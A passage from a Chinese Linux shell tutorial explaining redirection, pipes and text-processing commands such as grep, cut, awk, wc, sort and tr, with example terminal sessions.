来显示。</p>\n<p>但命令的错误输出信息还是会显示在屏幕上，正确输出会在文件中。</p>\n<h3 id=\"附加输出重定向\"><a class=\"anchor\" href=\"#附加输出重定向\">#</a> 附加输出重定向</h3>\n<p>与输出重定向相比附加重定向将内容追加到原有内容之后，不会覆盖原内容。利用符号 “&gt;&gt;” 来实现。</p>\n<h3 id=\"错误输出重定向\"><a class=\"anchor\" href=\"#错误输出重定向\">#</a> 错误输出重定向</h3>\n<p>Shell 中的标准输出与错误输出是两个独立的操作。错误输出也可以进行重定向。利用符号 “2&gt;” 来实现。</p>\n<h3 id=\"组合输出重定向\"><a class=\"anchor\" href=\"#组合输出重定向\">#</a> 组合输出重定向</h3>\n<p>若要将正确输出和错误输出重定向至某个文件，而屏幕上不显示任何内容，则可以利用符号 “&amp;&gt;” 来实现组合输出重定向功能。</p>\n<h3 id=\"输入重定向\"><a class=\"anchor\" href=\"#输入重定向\">#</a> 输入重定向</h3>\n<p>输入重定向是从某个文件读入数据，用 “&lt;” 符号来实现。由于大多数命令都已参数的形式在命令行上指定输入文件，所以并不常用。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">符号</th>\n<th style=\"text-align:left\">说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">command &lt;file</td>\n<td style=\"text-align:left\">将 file 文件中的内容作为 command 的输入。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">command &lt;&lt;END</td>\n<td style=\"text-align:left\">从标准输入（键盘）中读取数据，直到遇见分界符 END 才停止（分界符可以是任意的字符串，用户自己定义）。</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">command <file1 >file2</td>\n<td style=\"text-align:left\">将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"管道\"><a class=\"anchor\" href=\"#管道\">#</a> 管道</h2>\n<p>学习管道之前我们先了解一下 linux 的命令执行顺序</p>\n<h3 id=\"命令执行顺序控制\"><a class=\"anchor\" href=\"#命令执行顺序控制\">#</a> 命令执行顺序控制</h3>\n<p>通常情况下，我们在终端只能执行一条命令，然后按下回车执行，那么如何执行多条命令呢？</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>顺序执行多条命令：command1<span class=\"token punctuation\">;</span>command2<span class=\"token punctuation\">;</span>command3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>简单的顺序指令可以通过 <span class=\"token punctuation\">;</span>来实现</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>有条件的执行多条命令：which command1 <span class=\"token operator\">&amp;&amp;</span> command2 <span class=\"token operator\">||</span> command3 <span class=\"token comment\">## which 命令用于查找文件。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span> <span class=\"token builtin class-name\">:</span> 如果前一条命令执行成功则执行下一条命令，如果command1执行成功（返回0）,则执行command2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">||</span> :与<span class=\"token operator\">&amp;&amp;</span>命令相反，执行不成功时执行这个命令</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$?</span><span class=\"token builtin class-name\">:</span> 存储上一次命令的返回结果</pre></td></tr></table></figure><h3 id=\"管道命令\"><a class=\"anchor\" href=\"#管道命令\">#</a> 管道命令</h3>\n<blockquote>\n<p>管道是一种通信机制，通常用于进程间的通信（也可通过 socket 进行网络通信），它表现出来的形式将前面每一个进程的输出（stdout）直接作为下一个进程的输入（stdin）。</p>\n</blockquote>\n<p>管道命令使用 | 作为界定符号，管道命令与上面说的连续执行命令不一样。</p>\n<p>管道命令仅能处理 standard output, 对于 standard error output 会予以忽略。</p>\n<p><code>less,more,head,tail...都是可以接受standard input的命令，所以他们是管道命令</code> <br />\n <code>ls,cp,mv并不会接受standard input的命令，所以他们就不是管道命令了。</code></p>\n<p>管道命令必须要能够接受来自前一个命令的数据成为 standard input 继续处理才行。</p>\n<p>第一个管道命令<br />\n <code>$ ls -al /etc | less</code></p>\n<p>通过管道将 ls -al 的输出作为 下一个命令 less 的输入，方便浏览。</p>\n<h2 id=\"文本处理工具\"><a class=\"anchor\" href=\"#文本处理工具\">#</a> 文本处理工具</h2>\n<h3 id=\"提取文本\"><a class=\"anchor\" href=\"#提取文本\">#</a> 提取文本</h3>\n<h4 id=\"查看文件内容\"><a class=\"anchor\" href=\"#查看文件内容\">#</a> 查看文件内容</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式：cat 【选项】 文件列表</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>功能：显示文本文件内容</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>选项说明：-n  表示在每一行前面显示行号。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">more</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>格式：more 文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>功能： 分屏显示文本文件的内容。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>只能向后翻阅</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">less</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>与more命令非常相似，也能分屏显示文本文件的内容。用户可以用上下箭头、Enter键、Space键前后翻阅文本内容。使用Q键退出命令。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>less比more命令更方便。</pre></td></tr></table></figure><h4 id=\"产看文件摘录\"><a class=\"anchor\" href=\"#产看文件摘录\">#</a> 产看文件摘录</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式：head 【选项】 文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>功能：显示文本文件的开头部分，默认显示文件的前十行</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>主要选项说明： <span class=\"token string\">'-n 数字'</span> 表示指定显示的行数</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">tail</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>与head命令非常相似，用于显示文件的结尾部分，默认显示最后10行，也可以用<span class=\"token string\">'-n 数字'</span>选项</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>还可以用<span class=\"token string\">'-f'</span>选项表示跟进文件后续增加，通常用于监控日志文件，便于网络服务的排错处理。</pre></td></tr></table></figure><h4 id=\"按关键字提取文本\"><a class=\"anchor\" href=\"#按关键字提取文本\">#</a> 按关键字提取文本</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">grep</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>按照关键字进行文本的提取及过滤出含有某个关键字的行。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>grep命令通常与管道配合使用，通常的选项及含义如下：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-i 忽略大小写</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-n 行号显示</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-v 反向</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>^  以……开头</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>$  以……结尾</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-r 以递归方式搜索目录</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-AX 包括每个匹配项的后X行</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-BX 包括每个匹配项的前X行</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>--color 以颜色突出显示匹配项</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>-w 精确匹配某个单词</pre></td></tr></table></figure><h4 id=\"按列或字段提取文本\"><a class=\"anchor\" href=\"#按列或字段提取文本\">#</a> 按列或字段提取文本</h4>\n<p>按列或字段提取文本的命令常用的包括 cut 和 awk，通常与管道配合使用。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cut</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式：cut -d 字符 -f 数字 <span class=\"token function\">file</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>功能：提取文件file中以某字符未分割符的某列（或某字段）。其中-d后面的字符表示分隔符，-f后面的数字表示提取的列数。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/passwd | cut -d : -f 1,3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>root:0</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>bin:1</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>daemon:2</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>adm:3</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>lp:4</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sync:5</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>shutdown:6</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>halt:7</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>mail:8</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>operator:11</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>games:12</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ftp:14</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>【略】</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>显示文件/etc/passwd中以‘:’作为分隔符的第一列和第三列</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>cut命令还可以接-c选项，表示义字符个数截取。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/passwd | cut -c 1-3</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>roo</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>bin</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>dae</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>adm</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>lp:</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>syn</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>shu</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>【略】</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>表示截取/etc/passwd文件中的第1~3个字符</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token function\">awk</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>awk命令与cut命令类似，也按指定的分隔符进行截取。awk命令默认以空格为分隔符，且不管有多少个空格符都算一个，而cut命令则严格规定空格数。</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ifconfig | grep broadcast</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        inet <span class=\"token number\">192.168</span>.10.100  netmask <span class=\"token number\">255.255</span>.255.0  broadcast <span class=\"token number\">192.168</span>.10.255</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        inet <span class=\"token number\">192.168</span>.122.1  netmask <span class=\"token number\">255.255</span>.255.0  broadcast <span class=\"token number\">192.168</span>.122.255</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ifconfig | grep broadcast | awk '&#123;print $6&#125;'</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token number\">192.168</span>.10.255</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token number\">192.168</span>.122.255</pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>要截取网关地址，先用grep命令截取含有网关地址的行，这一行中以空格为分隔符，但空格个数不一致，不能用cut，要用awkml，截取第五列。<span class=\"token variable\">$5</span>表示第五列，<span class=\"token variable\">$NF</span>则表示倒数第一列。</pre></td></tr></table></figure><h3 id=\"分析文本\"><a class=\"anchor\" href=\"#分析文本\">#</a> 分析文本</h3>\n<h4 id=\"统计文本信息\"><a class=\"anchor\" href=\"#统计文本信息\">#</a> 统计文本信息</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">wc</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>格式：wc 【选项】 文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>功能：显示文本文件的行数、字数和字符数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>主要选项说明：</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-c      仅显示问价的字节数</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-l      仅显示问价的行数</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-w      仅显示文件的单词数</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># wc /etc/passwd</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token number\">44</span>  <span class=\"token number\">88</span>  <span class=\"token number\">2302</span>   /etc/passwd</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>wc命令依次显示文件的行数、单词数、字节数及文件名。</pre></td></tr></table></figure><h4 id=\"排序命令\"><a class=\"anchor\" href=\"#排序命令\">#</a> 排序命令</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sort</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sort</span> <span class=\"token punctuation\">[</span>-fbMnrtuk<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>file or stdin<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-f ：忽略大小写的差异，例如A 与a 视为编码相同</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-b ：忽略最前面的空格部分</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-M ：以月份的名字来排序，例如JAN, DEC 等等的排序方法</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-n ：使用『纯数字』进行排序默认是以文字型态来排序的<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-r ：反向排序</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-u ：就是uniq ，相同的资料中，仅出现一行代表</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-t ：分隔符号，预设是用<span class=\"token punctuation\">[</span>tab<span class=\"token punctuation\">]</span> 键来分隔</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>-k ：以那个区间<span class=\"token punctuation\">(</span>field<span class=\"token punctuation\">)</span> 来进行排序的意思</pre></td></tr></table></figure><h3 id=\"处理文本\"><a class=\"anchor\" href=\"#处理文本\">#</a> 处理文本</h3>\n<h4 id=\"转换字符\"><a class=\"anchor\" href=\"#转换字符\">#</a> 转换字符</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tr</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Linux <span class=\"token function\">tr</span> 命令用于转换或删除文件中的字符。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tr</span> 指令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>语法</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">tr</span> <span class=\"token punctuation\">[</span>-cdst<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--version<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>第一字符集<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>第二字符集<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">tr</span> <span class=\"token punctuation\">[</span>OPTION<span class=\"token punctuation\">]</span>…SET1<span class=\"token punctuation\">[</span>SET2<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>参数说明：</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>-d, --delete：删除指令字符</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>--help：显示程序用法信息</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>--version：显示程序本身的版本信息</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>字符集合的范围：</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">\\</span>NNN 八进制值的字符 NNN <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> to <span class=\"token number\">3</span> 为八进制值的字符<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span> 反斜杠</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">\\</span>a Ctrl-G 铃声</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">\\</span>b Ctrl-H 退格符</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">\\</span>f Ctrl-L 走行换页</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">\\</span>n Ctrl-J 新行</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">\\</span>r Ctrl-M 回车</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">\\</span>t Ctrl-I tab键</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">\\</span>v Ctrl-X 水平制表符</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">[</span>CHAR*<span class=\"token punctuation\">]</span> ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">[</span>CHAR*REPEAT<span class=\"token punctuation\">]</span> ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止<span class=\"token punctuation\">(</span>REPEAT 的数字采 <span class=\"token number\">8</span> 进位制计算，以 <span class=\"token number\">0</span> 为开始<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">[</span>:alnum:<span class=\"token punctuation\">]</span> ：所有字母字符与数字</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">[</span>:alpha:<span class=\"token punctuation\">]</span> ：所有字母字符</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">[</span>:blank:<span class=\"token punctuation\">]</span> ：所有水平空格</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">[</span>:cntrl:<span class=\"token punctuation\">]</span> ：所有控制字符</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">[</span>:digit:<span class=\"token punctuation\">]</span> ：所有数字</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">[</span>:graph:<span class=\"token punctuation\">]</span> ：所有可打印的字符<span class=\"token punctuation\">(</span>不包含空格符<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">[</span>:lower:<span class=\"token punctuation\">]</span> ：所有小写字母</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">[</span>:print:<span class=\"token punctuation\">]</span> ：所有可打印的字符<span class=\"token punctuation\">(</span>包含空格符<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">[</span>:punct:<span class=\"token punctuation\">]</span> ：所有标点字符</pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">[</span>:space:<span class=\"token punctuation\">]</span> ：所有水平与垂直空格符</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">[</span>:upper:<span class=\"token punctuation\">]</span> ：所有大写字母</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">[</span>:xdigit:<span class=\"token punctuation\">]</span> ：所有 <span class=\"token number\">16</span> 进位制的数字</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token operator\">=</span>CHAR<span class=\"token operator\">=</span><span class=\"token punctuation\">]</span> ：所有符合指定的字符<span class=\"token punctuation\">(</span>等号里的 CHAR，代表你可自订的字符<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>将文件testfile中的小写字母全部转换成大写字母，此时，可使用如下命令：</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token function\">cat</span> testfile <span class=\"token operator\">|</span><span class=\"token function\">tr</span> a-z A-Z </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>testfile文件中的内容如下：</pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile         <span class=\"token comment\">#testfile 原来的内容  </span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>Linux networks are becoming <span class=\"token function\">more</span> and <span class=\"token function\">more</span> common, </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>but scurity is often an overlooked  </pre></td></tr><tr><td data-num=\"54\"></td><td><pre>issue. Unfortunately, <span class=\"token keyword\">in</span> today’s environment all networks </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>are potential hacker targets,  </pre></td></tr><tr><td data-num=\"56\"></td><td><pre>fro0m tp-secret military research networks to small home LANs.  </pre></td></tr><tr><td data-num=\"57\"></td><td><pre>Linux Network Securty focuses on securing Linux <span class=\"token keyword\">in</span> a </pre></td></tr><tr><td data-num=\"58\"></td><td><pre>networked environment, where the  </pre></td></tr><tr><td data-num=\"59\"></td><td><pre>security of the entire network needs to be considered</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>rather than just isolated machines.  </pre></td></tr><tr><td data-num=\"61\"></td><td><pre>It uses a mix of theory and practicl techniques to </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>teach administrators how to <span class=\"token function\">install</span> and  </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>use security applications, as well as how the </pre></td></tr><tr><td data-num=\"64\"></td><td><pre>applcations work and why they are necesary. </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>使用 <span class=\"token function\">tr</span> 命令大小写转换后，得到如下输出结果：</pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> a-z A-Z <span class=\"token comment\">#转换后的输出  </span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED  </pre></td></tr><tr><td data-num=\"69\"></td><td><pre>ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS,  </pre></td></tr><tr><td data-num=\"70\"></td><td><pre>FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL <span class=\"token environment constant\">HOME</span> LANS.  </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE  </pre></td></tr><tr><td data-num=\"72\"></td><td><pre>SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES.  </pre></td></tr><tr><td data-num=\"73\"></td><td><pre>IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND  </pre></td></tr><tr><td data-num=\"74\"></td><td><pre>USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY. </pre></td></tr><tr><td data-num=\"75\"></td><td><pre>大小写转换，也可以通过<span class=\"token punctuation\">[</span>:lower<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>:upper<span class=\"token punctuation\">]</span>参数来实现。例如使用如下命令：</pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token function\">cat</span> testfile <span class=\"token operator\">|</span><span class=\"token function\">tr</span> <span class=\"token punctuation\">[</span>:lower:<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>:upper:<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"78\"></td><td><pre>输出结果如下：</pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile <span class=\"token operator\">|</span> <span class=\"token function\">tr</span> <span class=\"token punctuation\">[</span>:lower:<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>:upper:<span class=\"token punctuation\">]</span> <span class=\"token comment\">#转换后的输出  </span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>LINUX NETWORKS ARE BECOMING MORE AND MORE COMMON, BUT SCURITY IS OFTEN AN OVERLOOKED  </pre></td></tr><tr><td data-num=\"82\"></td><td><pre>ISSUE. UNFORTUNATELY, IN TODAY’S ENVIRONMENT ALL NETWORKS ARE POTENTIAL HACKER TARGETS,  </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>FROM TP-SECRET MILITARY RESEARCH NETWORKS TO SMALL <span class=\"token environment constant\">HOME</span> LANS.  </pre></td></tr><tr><td data-num=\"84\"></td><td><pre>LINUX NETWORK SECURTY FOCUSES ON SECURING LINUX IN A NETWORKED ENVIRONMENT, WHERE THE  </pre></td></tr><tr><td data-num=\"85\"></td><td><pre>SECURITY OF THE ENTIRE NETWORK NEEDS TO BE CONSIDERED RATHER THAN JUST ISOLATED MACHINES.  </pre></td></tr><tr><td data-num=\"86\"></td><td><pre>IT USES A MIX OF THEORY AND PRACTICL TECHNIQUES TO TEACH ADMINISTRATORS HOW TO INSTALL AND  </pre></td></tr><tr><td data-num=\"87\"></td><td><pre>USE SECURITY APPLICATIONS, AS WELL AS HOW THE APPLCATIONS WORK AND WHY THEY ARE NECESARY.</pre></td></tr></table></figure><h4 id=\"查找替换\"><a class=\"anchor\" href=\"#查找替换\">#</a> 查找替换</h4>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sed</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>stream editor的缩写，用于对文本流进行查找替换操作，不改变源文件。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux <span class=\"token function\">sed</span> 